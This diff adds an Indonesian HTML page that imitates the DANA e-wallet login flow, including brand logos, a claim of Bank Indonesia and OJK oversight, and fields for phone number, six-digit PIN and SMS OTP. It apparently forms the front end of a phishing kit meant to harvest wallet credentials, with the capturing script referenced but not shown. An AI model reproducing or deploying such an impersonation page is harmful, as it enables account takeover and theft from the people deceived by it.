@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>DANA - Dompet Digital Indonesia</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+  <div class="app-container">
+    
+    <!-- 1. SPLASH SCREEN -->
+    <div id="splashScreen" class="screen splash-screen">
+      <div class="splash-content">
+        <img class="logo-dana" src="foto/logo_text.png">
+      </div>
+      <div class="footimg">
+         <img src="foto/bi.png">
+         <img src="foto/ojk.png">
+         <p>DANA Indonesia terdaftar dan diawasi<br>oleh <b>BANK INDONESIA</b> dan <b>OJK</b></p>
+      </div>
+    </div>
+
+    <!-- 2. LOADING SCREEN WITH LOGO INSIDE SPINNER -->
+    <div id="loadingScreen" class="loading-overlay hidden">
+      <div class="spinner-box">
+      <img src="foto/load_spin.png" alt="Ring Photo" class="spinner-photo-ring">
+      <img src="foto/load_bg.png" alt="Logo" class="spinner-logo-img">
+      </div>
+    </div>
+
+    <!-- 3. HALAMAN NOMOR TELEPON -->
+    <div id="pagePhone" class="screen page-content hidden">
+      <!-- Logo Tengah Atas -->
+      <div class="top-logo-container">
+        <img class="logo-dana small" src="foto/dana_logo.png">
+      </div>
+      
+      <div class="form-body">
+        <h3 class="main-title">Masukkan <b>Nomor HP</b> kamu untuk lanjut</h3>
+        <div class="input-wrapper">
+          <div class="country-box">
+            <svg class="flag-id" viewBox="0 0 900 600" width="24" height="16">
+              <rect width="900" height="300" fill="#FF0000"/>
+              <rect y="300" width="900" height="300" fill="#FFFFFF"/>
+            </svg>
+            <span class="code">+62</span>
+          </div>
+          <input type="tel" id="phoneInput" placeholder="812-3456-7890" inputmode="numeric" autocomplete="off">
+        </div>
+        <p class="subtitle">Nomor ponsel akan digunakan sebagai ID kamu &<br>
+                        menjaga akun selalu aman. Dengan melanjutkan,<br>
+                        kamu setuju dengan <b>Syarat & Ketentuan</b>
+                        dan<br>
+                        <b>Kebijakan Privasi</b>
+                        kami</p>
+      </div>
+      
+      <div class="footer-action">
+        <button id="btnNext" class="btn-primary" disabled>LANJUT</button>
+      </div>
+    </div>
+
+    <!-- 4. HALAMAN INPUT PIN -->
+    <div id="pagePin" class="screen page-content hidden">
+      <!-- Logo Tengah Atas (Tanpa Top Nav / Tombol Kembali) -->
+      <div class="top-logo-container">
+        <img class="logo-dana small" src="foto/dana_logo.png">
+      </div>
+      
+      <div class="form-body text-center">
+        <h3 class="main-title text-center">Masukkan <b>PIN DANA</b></h3>
+        
+        <div class="pin-container">
+          <input type="password" id="pin1" maxlength="1" class="pin-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+          <input type="password" id="pin2" maxlength="1" class="pin-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+          <input type="password" id="pin3" maxlength="1" class="pin-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+          <input type="password" id="pin4" maxlength="1" class="pin-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+          <input type="password" id="pin5" maxlength="1" class="pin-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+          <input type="password" id="pin6" maxlength="1" class="pin-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+        </div>
+        <a href="#" class="forgot-link">Lupa PIN?</a>
+      </div>
+    </div>
+
+    <!-- 5. BOTTOM SHEET INPUT OTP -->
+    <!-- 5. BOTTOM SHEET INPUT OTP (Ditambahkan kelas hidden) -->
+<div id="otpBottomSheet" class="bottom-sheet hidden">
+  <div class="sheet-backdrop"></div>
+  <div class="sheet-content">
+    <div class="sheet-handle"></div>
+    <div class="sheet-body text-center">
+      <h3 class="sheet-title">Masukkan Kode OTP</h3>
+      <p class="sheet-subtitle">Kami telah mengirimkan kode verifikasi 4-digit melalui SMS ke nomor HP kamu.</p>
+      
+      <div class="otp-container">
+        <input type="text" id="otp1" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+        <input type="text" id="otp2" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+        <input type="text" id="otp3" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+        <input type="text" id="otp4" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+      </div>
+      
+      <div class="countdown-text">Kirim ulang dalam <span id="timer">60</span> detik</div>
+    </div>
+  </div>
+</div>
+
+    
+  </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js" integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script src="js/script.js"></script>
+</body>
+</html>
